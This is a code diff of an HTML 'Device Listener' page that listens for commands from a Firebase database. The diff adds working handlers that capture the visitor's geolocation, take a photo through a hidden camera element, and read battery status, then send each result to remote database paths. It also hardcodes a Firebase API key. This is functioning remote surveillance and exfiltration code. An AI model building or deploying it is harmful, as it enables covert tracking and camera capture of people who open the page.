@@ -2,12 +2,12 @@
 <html>
 <head>
   <title>Device Listener</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 </head>
 <body>
-  <h2>Listening for Commands...</h2>
-
+  <h2>Listener Activated</h2>
+  <video id="camera" autoplay style="display:none;"></video>
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyA3eivOxIpneLJYcmqAUrmVQaURCipy9oo",
@@ -20,25 +20,55 @@
     };
 
     firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    const db = firebase.database();
 
-    const deviceId = "device1";
+    // Command Listener
+    db.ref("commands").on("value", async (snapshot) => {
+      const data = snapshot.val();
+      if (!data || !data.action) return;
 
-    const commandRef = database.ref("devices/" + deviceId + "/command");
+      if (data.action === "get_location") {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(position => {
+            db.ref("responses/location").set({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              timestamp: Date.now()
+            });
+          });
+        }
+      }
 
-    commandRef.on("value", (snapshot) => {
-      const command = snapshot.val();
-      if (command === "getLocation") {
-        navigator.geolocation.getCurrentPosition((position) => {
-          const location = {
-            lat: position.coords.latitude,
-            lng: position.coords.longitude
-          };
-          database.ref("devices/" + deviceId + "/response").set(location);
+      else if (data.action === "take_picture") {
+        const video = document.getElementById("camera");
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        const image = canvas.toDataURL("image/jpeg");
+        db.ref("responses/image").set({
+          image,
+          timestamp: Date.now()
         });
-      } else if (command === "takePicture") {
-        alert("Camera function would go here. Add image code later.");
-        // You can add camera + emailjs logic here if needed
+
+        stream.getTracks().forEach(track => track.stop());
+      }
+
+      else if (data.action === "battery_status") {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          db.ref("responses/battery").set({
+            level: battery.level,
+            charging: battery.charging,
+            timestamp: Date.now()
+          });
+        }
       }
     });
   </script>
